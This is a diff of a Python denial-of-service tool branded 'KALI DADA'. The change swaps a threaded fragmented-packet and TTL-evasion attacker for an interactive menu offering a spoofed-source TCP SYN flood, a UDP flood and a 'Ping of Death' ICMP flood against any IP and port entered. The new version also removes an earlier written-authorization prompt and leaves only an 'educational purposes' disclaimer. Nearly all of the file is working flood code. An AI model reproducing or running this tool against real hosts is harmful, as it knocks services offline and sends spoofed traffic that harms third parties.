@@ -1,45 +1,42 @@
 import os
 import sys
 import time
-import random
 import socket
-import threading
-from scapy.all import *
-from datetime import datetime
+import random
+from scapy.all import IP, TCP, ICMP, send
 
-# Colors for printing
-COLORS = {
-    "GREEN": "\033[92m",
-    "RED": "\033[91m",
-    "CYAN": "\033[96m",
-    "YELLOW": "\033[93m",
-    "BOLD": "\033[1m",
-    "RESET": "\033[0m"
-}
+# ANSI Colors for Hacker Theme
+GREEN  = "\033[92m"
+RED    = "\033[91m"
+CYAN   = "\033[96m"
+YELLOW = "\033[93m"
+BOLD   = "\033[1m"
+RESET  = "\033[0m"
 
-EVASION_TECHNIQUES = {
-    1: "Fragmented Packet Attack",
-    2: "TTL Manipulation",
-}
+# Your name for display
+NAME = "Sujal Lamichhane"
 
-# Print warning message
 def print_warning():
+    """Display a warning message before starting."""
     os.system("clear")
-    warning = f"""
-{COLORS['RED']}{COLORS['BOLD']}
+    warning_message = f"""
+{RED}{BOLD}
 ##############################################################################
-#  WARNING: STRICTLY FOR AUTHORIZED PENETRATION TESTING ONLY!                #
-#  UNAUTHORIZED USE IS ILLEGAL AND UNETHICAL. COMPLY WITH ALL LAWS.          #
+#  WARNING: THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY!                      #
+#  THE AUTHOR IS NOT RESPONSIBLE FOR ANY MISUSE OR ILLEGAL ACTIVITIES.       #
+#  USE THIS TOOL ONLY IN A CONTROLLED AND AUTHORIZED ENVIRONMENT.            #
 ##############################################################################
-{COLORS['RESET']}"""
-    print(warning)
+{RESET}
+"""
+    print(warning_message)
     time.sleep(3)
 
-# Display banner
-def print_hacker_banner():
+def print_kali_dada_banner():
+    """Display the KALI DADA banner and website info."""
     os.system("clear")
     banner = f"""
-{COLORS['GREEN']}{COLORS['BOLD']}
+{GREEN}{BOLD}
+
 
  /$$   /$$  /$$$$$$  /$$       /$$$$$$       /$$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$ 
 | $$  /$$/ /$$__  $$| $$      |_  $$_/      | $$__  $$ /$$__  $$| $$__  $$ /$$__  $$
@@ -50,148 +47,142 @@ def print_hacker_banner():
 | $$ \  $$| $$  | $$| $$$$$$$$ /$$$$$$      | $$$$$$$/| $$  | $$| $$$$$$$/| $$  | $$
 |__/  \__/|__/  |__/|________/|______/      |_______/ |__/  |__/|_______/ |__/  |__/
                                                                                     
-
-{COLORS['RESET']}
-{COLORS['CYAN']}Welcome to Kali Dada's Advanced Penetration Testing Suite{COLORS['RESET']}
+                                                                            
+               {CYAN}Welcome to KALI DADA's Cyber Attack Simulation Tool{RESET}
 """
     print(banner)
+    print(f"{YELLOW}Created by: {NAME}{RESET}")
+    print(f"{CYAN}Website: sujallamichhane.com.np{RESET}")
+    print(f"{CYAN}[INFO] Visit: sujallamichhane.com.np for more cybersecurity insights!{RESET}\n")
     time.sleep(1)
 
-# Validate IP address
-def validate_ip(ip):
+def check_root():
+    """Ensure the script is run as root."""
+    if os.geteuid() != 0:
+        print(f"{RED}[!] This script must be run as root (sudo). Exiting...{RESET}")
+        sys.exit(1)
+
+def server_status(target_ip):
+    """Check if the target server is up by attempting a connection on port 80."""
     try:
-        socket.inet_aton(ip)  # Validate if it's a valid IPv4 address
+        socket.create_connection((target_ip, 80), timeout=2)
+        print(f"{GREEN}[+] Server {target_ip} is UP!{RESET}")
         return True
-    except socket.error:
+    except Exception as e:
+        print(f"{RED}[-] Server {target_ip} is DOWN! Error: {e}{RESET}")
         return False
 
-# Check if server is up or down
-def check_server_status(target):
+def syn_flood(target_ip, target_port, duration):
+    """Perform a TCP SYN Flood Attack."""
+    print(f"{YELLOW}[+] Starting TCP SYN Flood Attack on {target_ip}:{target_port}{RESET}")
+    timeout = time.time() + duration
+    packet_count = 0
     try:
-        socket.setdefaulttimeout(3)
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target, 80))  # Check if the server responds on port 80 (HTTP)
-        s.close()
-        return True
-    except socket.error:
-        return False
+        while time.time() < timeout:
+            # Generate a random source IP
+            src_ip = ".".join(map(str, (random.randint(1, 255) for _ in range(4))))
+            packet = IP(src=src_ip, dst=target_ip) / TCP(sport=random.randint(1024, 65535),
+                                                          dport=target_port, flags="S")
+            send(packet, verbose=False)
+            packet_count += 1
+            print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
+    except KeyboardInterrupt:
+        print(f"\n{RED}[INFO] Stopping TCP SYN Flood Attack...{RESET}")
+        print(f"{GREEN}Happy Hacking!{RESET}")
+    print(f"\n{GREEN}[+] SYN Flood Attack Completed. Packets Sent: {packet_count}{RESET}")
 
-# Attack Class: Advanced DoS Attack
-class AdvancedDoSAttack:
-    def __init__(self, target, port, duration):
-        self.target = target
-        self.port = port
-        self.duration = duration
-        self.packet_count = 0
-        self.lost_packets = 0
-        self.blocked_packets = 0
-        self.rate_limit = 1000  # Packets per second
-        self.successful_attack = False
+def udp_flood(target_ip, target_port, duration):
+    """Perform a UDP Flood Attack."""
+    print(f"{YELLOW}[+] Starting UDP Flood Attack on {target_ip}:{target_port}{RESET}")
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        packet = random._urandom(1024)
+    except Exception as e:
+        print(f"{RED}[ERROR] Could not create UDP socket: {e}{RESET}")
+        return
+    timeout = time.time() + duration
+    packet_count = 0
+    try:
+        while time.time() < timeout:
+            sock.sendto(packet, (target_ip, target_port))
+            packet_count += 1
+            print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
+    except KeyboardInterrupt:
+        print(f"\n{RED}[INFO] Stopping UDP Flood Attack...{RESET}")
+        print(f"{GREEN}Happy Hacking!{RESET}")
+    print(f"\n{GREEN}[+] UDP Flood Attack Completed. Packets Sent: {packet_count}{RESET}")
 
-    def _fragmented_attack(self):
-        # Generate random payload and send fragmented packets
-        payload = random.choice([b"GET / HTTP/1.1", b"POST / HTTP/1.1", b"ICMP Echo Request"])
-        frags = fragment(IP(dst=self.target)/UDP(dport=self.port)/payload)
-        return frags
+def ping_of_death(target_ip, duration):
+    """Perform a Ping of Death Attack."""
+    print(f"{YELLOW}[+] Starting Ping of Death Attack on {target_ip}{RESET}")
+    timeout = time.time() + duration
+    packet_count = 0
+    try:
+        while time.time() < timeout:
+            packet = IP(dst=target_ip) / ICMP() / (b"X" * 65500)
+            send(packet, verbose=False)
+            packet_count += 1
+            print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
+    except KeyboardInterrupt:
+        print(f"\n{RED}[INFO] Stopping Ping of Death Attack...{RESET}")
+        print(f"{GREEN}Happy Hacking!{RESET}")
+    print(f"\n{GREEN}[+] Ping of Death Attack Completed. Packets Sent: {packet_count}{RESET}")
 
-    def _ttl_evasion(self):
-        # Manipulate TTL to random values
-        return random.randint(32, 255)
-
-    def _send_packets(self, technique):
-        start = time.time()
-        while time.time() - start < self.duration:
-            try:
-                if technique == 1:  # Fragmented Packet Attack
-                    send(self._fragmented_attack(), verbose=0)
-                elif technique == 2:  # TTL Manipulation
-                    pkt = IP(dst=self.target, ttl=self._ttl_evasion())/TCP(dport=self.port)
-                    send(pkt, verbose=0)
-
-                self.packet_count += 1
-                time.sleep(1/self.rate_limit + random.uniform(-0.001, 0.001))
-
-            except Exception as e:
-                # Track lost packets due to errors
-                self.lost_packets += 1
-                print(f"{COLORS['RED']}Error: {e}{COLORS['RESET']}")
-
-    def _check_firewall_block(self):
-        # Simple method to check if firewall blocks packets (by trying to connect)
+def select_attack():
+    """Prompt user to select the type of attack."""
+    while True:
+        print(f"{BOLD}{YELLOW}\nSelect Attack Type:{RESET}")
+        print("1: TCP SYN Flood")
+        print("2: UDP Flood")
+        print("3: Ping of Death")
+        print("4: Exit")
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(5)
-            result = sock.connect_ex((self.target, self.port))
-            if result != 0:
-                self.blocked_packets += 1
-                return True  # Firewall might be blocking the attack
-            sock.close()
-        except socket.error:
-            pass
-        return False
-
-    def start_attack(self, technique, threads=5):
-        print(f"{COLORS['YELLOW']}Starting {EVASION_TECHNIQUES[technique]}...{COLORS['RESET']}")
-        self.successful_attack = True
-        for _ in range(threads):
-            threading.Thread(target=self._send_packets, args=(technique,)).start()
-
-    def stop_attack(self):
-        print(f"{COLORS['CYAN']}Attack concluded.{COLORS['RESET']}")
-        print(f"{COLORS['GREEN']}Total packets sent: {self.packet_count}{COLORS['RESET']}")
-        print(f"{COLORS['RED']}Lost packets: {self.lost_packets}{COLORS['RESET']}")
-        print(f"{COLORS['CYAN']}Blocked by firewall: {self.blocked_packets}{COLORS['RESET']}")
-
-        # Final status check
-        if self._check_firewall_block():
-            print(f"{COLORS['RED']}The server is likely blocking your attack via firewall.{COLORS['RESET']}")
+            choice = int(input(f"{CYAN}Enter your choice (1-4): {RESET}"))
+        except ValueError:
+            print(f"{RED}[ERROR] Invalid input. Please enter a number between 1 and 4.{RESET}")
+            continue
+        
+        if choice == 4:
+            print(f"{GREEN}Exiting...{RESET}")
+            sys.exit(0)
+        
+        target_ip = input(f"{CYAN}Enter Target IP: {RESET}").strip()
+        if choice in [1, 2]:
+            try:
+                target_port = int(input(f"{CYAN}Enter Target Port: {RESET}").strip())
+            except ValueError:
+                print(f"{RED}[ERROR] Invalid port number.{RESET}")
+                continue
         else:
-            print(f"{COLORS['GREEN']}Attack was successful!{COLORS['RESET']}")
+            target_port = None
+        try:
+            duration = int(input(f"{CYAN}Enter Duration (seconds): {RESET}").strip())
+        except ValueError:
+            print(f"{RED}[ERROR] Invalid duration.{RESET}")
+            continue
+        
+        if not server_status(target_ip):
+            print(f"{RED}[ERROR] Target server seems down. Check the IP or try again later.{RESET}")
+            continue
+        
+        if choice == 1:
+            syn_flood(target_ip, target_port, duration)
+        elif choice == 2:
+            udp_flood(target_ip, target_port, duration)
+        elif choice == 3:
+            ping_of_death(target_ip, duration)
+        
+        # After completing the attack, ask the user if they want to continue
+        continue_choice = input(f"{CYAN}Do you want to perform another attack? (y/n): {RESET}").strip().lower()
+        if continue_choice != 'y':
+            print(f"{GREEN}Exiting...{RESET}")
+            break
 
-# Main menu for user input
-def main_menu():
-    print(f"{COLORS['CYAN']}Select an attack technique:{COLORS['RESET']}")
-    for technique in EVASION_TECHNIQUES:
-        print(f"{COLORS['CYAN']}{technique}. {EVASION_TECHNIQUES[technique]}{COLORS['RESET']}")
-    choice = input(f"{COLORS['YELLOW']}Choose attack type (1 or 2): {COLORS['RESET']}")
-    target = input(f"{COLORS['YELLOW']}Enter target IP: {COLORS['RESET']}")
-    port = int(input(f"{COLORS['YELLOW']}Enter target port: {COLORS['RESET']}"))
-    duration = int(input(f"{COLORS['YELLOW']}Enter attack duration in seconds: {COLORS['RESET']}"))
-    return int(choice), target, port, duration
+def main():
+    print_kali_dada_banner()
+    check_root()
+    select_attack()
 
-# Authorization check (ensure this is authorized)
-def authorization_check():
-    confirm = input(f"{COLORS['RED']}Do you have written authorization for this test? (y/N): {COLORS['RESET']}")
-    if confirm.lower() != 'y':
-        print(f"{COLORS['RED']}Authorization required. Exiting...{COLORS['RESET']}")
-        sys.exit(0)
-
-# Main execution flow
 if __name__ == "__main__":
     print_warning()
-    print_hacker_banner()
-    authorization_check()
-
-    if os.geteuid() != 0:
-        print(f"{COLORS['RED']}Root privileges required for raw socket operations{COLORS['RESET']}")
-        sys.exit(1)
-
-    technique, target, port, duration = main_menu()
-
-    if not validate_ip(target):
-        print(f"{COLORS['RED']}Invalid IP address. Please enter a valid IP address.{COLORS['RESET']}")
-        sys.exit(1)
-
-    if not check_server_status(target):
-        print(f"{COLORS['RED']}Server is down or unreachable. Cannot continue the attack.{COLORS['RESET']}")
-        sys.exit(1)
-
-    dos_attack = AdvancedDoSAttack(target, port, duration)
-
-    try:
-        dos_attack.start_attack(technique)
-        time.sleep(duration)
-    except KeyboardInterrupt:
-        pass
-    finally:
-        dos_attack.stop_attack()
+    main()
